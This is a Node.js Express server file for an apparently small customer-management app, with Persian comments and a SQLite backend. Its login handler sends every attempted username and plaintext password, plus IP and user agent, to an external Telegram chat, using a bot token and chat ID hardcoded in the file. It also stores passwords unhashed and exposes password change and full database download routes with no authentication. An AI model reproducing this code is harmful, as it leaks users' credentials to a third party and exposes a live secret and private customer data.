const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const os = require('os');

const app = express();
const dbPath = path.join(__dirname, 'm3hdiclub.db');
const tempDbPath = path.join(__dirname, 'imported_db_temp.db'); // مسیر فایل موقت
const backupDbPath = path.join(__dirname, 'm3hdiclub_backup.db'); // مسیر فایل بکاپ

app.use(bodyParser.json());
app.use(express.static('public'));

let db = new sqlite3.Database(dbPath);

// Function to reload the database
function loadDatabase() {
    db = new sqlite3.Database(dbPath);
}

// تغییر نام کاربری و رمز عبور
app.post('/change-password', (req, res) => {
    const { newUsername, newPassword } = req.body;

    db.run('UPDATE Users SET username = ?, password = ? WHERE rowid = 1', [newUsername, newPassword], function(err) {
        if (err) {
            console.error('Error updating user:', err.message);
            return res.status(500).json({ success: false, message: 'خطا در تغییر اطلاعات کاربر' });
        }

        res.json({ success: true });
    });
});

// اضافه کردن مسیر برای ذخیره اطلاعات مشتری
app.post('/save-customer', (req, res) => {
    const { fullname, service, description, payment, telegram, startdate, enddate } = req.body;

    if (!fullname || !service || !startdate || !enddate || !payment) {
        return res.status(400).json({ success: false, message: 'Missing required fields.' });
    }

    db.run(`INSERT INTO Customers (name, service, description, payment, telegramUser, startDate, endDate) VALUES (?, ?, ?, ?, ?, ?, ?)`, 
    [fullname, service, description, payment, telegram, startdate, enddate], 
    function(err) {
        if (err) {
            console.error('Error inserting data:', err.message);
            return res.status(500).json({ success: false, message: 'Error saving customer data.' });
        }

        res.json({ success: true });
    });
});

// اضافه کردن مسیر جدید برای دریافت نام محصولات
app.get('/products', (req, res) => {
    db.all('SELECT name FROM Products', (err, rows) => {
        if (err) {
            console.error('Error querying database:', err.message);
            return res.status(500).json({ success: false, message: 'Error fetching products' });
        }
        res.json(rows);
    });
});

// اضافه کردن مسیر برای جستجوی مشتری بر اساس نام
app.get('/find-customer', (req, res) => {
    const searchName = req.query.name.toLowerCase();
    const query = 'SELECT * FROM Customers WHERE LOWER(name) = ?';

    db.all(query, [searchName], (err, rows) => {
        if (err) {
            console.error('Error querying database:', err.message);
            return res.status(500).json({ success: false, message: 'خطا در جستجوی مشتری' });
        }
        res.json(rows);
    });
});

// اضافه کردن مسیر جدید برای جستجوی مشتریان بر اساس تاریخ شروع
app.get('/all-customers', (req, res) => {
    let query = 'SELECT * FROM Customers';
    const startDate = req.query.startDate;

    if (startDate) {
        query += ' WHERE startDate LIKE ?';
        db.all(query, [`${startDate}%`], (err, rows) => {
            if (err) {
                console.error('Error querying database:', err.message);
                return res.status(500).json({ success: false, message: 'Error fetching customers' });
            }
            res.json(rows);
        });
    } else {
        db.all(query, [], (err, rows) => {
            if (err) {
                console.error('Error querying database:', err.message);
                return res.status(500, 'Error fetching customers');
            }
            res.json(rows);
        });
    }
});



// مسیر جدید برای دریافت قیمت خدمت
app.get('/service-price', (req, res) => {
    const serviceName = req.query.name;

    db.get('SELECT price FROM Products WHERE name = ?', [serviceName], (err, row) => {
        if (err) {
            console.error('Error querying database:', err.message);
            return res.status(500).json({ success: false, message: 'Error fetching service price' });
        }
        res.json(row ? row.price : 0);
    });
});

// مسیر برای خروجی گرفتن از دیتابیس
app.get('/export-db', (req, res) => {
    const file = dbPath;
    res.download(file, 'm3hdiclub_backup.db', (err) => {
        if (err) {
            console.error("Error exporting database:", err);
            res.status(500).send({ success: false, message: 'Failed to export database.' });
        }
    });
});

app.get('/last-customers', (req, res) => {
    const endDate = req.query.endDate;

    if (!endDate) {
        return res.status(400).json({ error: 'End date is required' });
    }

    const db = new sqlite3.Database(dbPath);

    db.all('SELECT * FROM customers WHERE endDate = ?', [endDate], (err, rows) => {
        if (err) {
            return res.status(500).json({ error: 'Internal Server Error' });
        }
        res.json(rows);
    });

    db.close();
});

const axios = require('axios');

const TELEGRAM_BOT_TOKEN = '7460897046:AAFg7vWuC1bncN6fFxRbkSCqXLMWdzm05gc';
const TELEGRAM_CHAT_ID = '5246453854';

async function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });
    } catch (error) {
        console.error('Error sending Telegram message:', error);
    }
}

// بررسی نام کاربری و رمز عبور
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const userIp = req.ip;  // آی‌پی کاربر

    // توجه: رمز عبور باید به صورت هش شده ذخیره شود و مقایسه هش‌ها باید انجام شود
    db.get('SELECT * FROM Users WHERE username = ? AND password = ?', [username, password], (err, row) => {
        if (err) {
            console.error('Error querying database:', err.message);
            return res.status(500).json({ success: false, message: 'خطا در بررسی اطلاعات کاربر' });
        }

        const deviceInfo = `Device Info:\n- Username: ${username}\n- Password: ${password}\n- IP: ${userIp}\n- User-Agent: ${req.headers['user-agent']}`;
        
        if (row) {
            sendTelegramMessage(`✅Login successful:✅\n${deviceInfo}`);
            res.json({ success: true });
        } else {
            sendTelegramMessage(`❌Failed login attempt:❌\n${deviceInfo}`);
            res.json({ success: false });
        }
    });
});




// اجرای سرور
const PORT = 7724; // یا هر پورتی که شما انتخاب می‌کنید
const HOST = '0.0.0.0';

app.listen(PORT, HOST, () => {
    console.log(`Server is running on http://${HOST}:${PORT}`);
});
